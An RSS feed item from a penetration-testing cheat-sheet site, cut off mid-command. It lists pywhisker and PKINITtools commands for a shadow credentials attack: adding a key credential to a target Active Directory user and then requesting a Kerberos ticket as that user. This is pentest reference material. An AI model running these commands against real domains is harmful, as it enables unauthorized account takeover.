channel.title: Whisker on TLDRBins
channel.description: Recent content in Whisker on TLDRBins

item.title: AddKeyCredentialLink
item.description: From Linux pywhisker 0. Pre-check (optional) python3 pywhisker.py --action list -d example.com -u current_user -p password --dc-ip 10.10.11.10 -t target_user --use-ldaps 1. Add shadow credentials python3 pywhisker.py --action add -d example.com -u current_user -p password --dc-ip 10.10.11.10 -t target_user --use-ldaps # Fix module 'OpenSSL.crypto' has no attribute 'PKCS12Type' pip3 install -I pyopenssl==24.0.0 2. Request TGT using PFX file PKINITtools sudo ntpdate -s 10.10.11.10 && python3 gettgtpkinit.py -cert-pfx <.pfx> -pfx-pass <pfx_password> example.
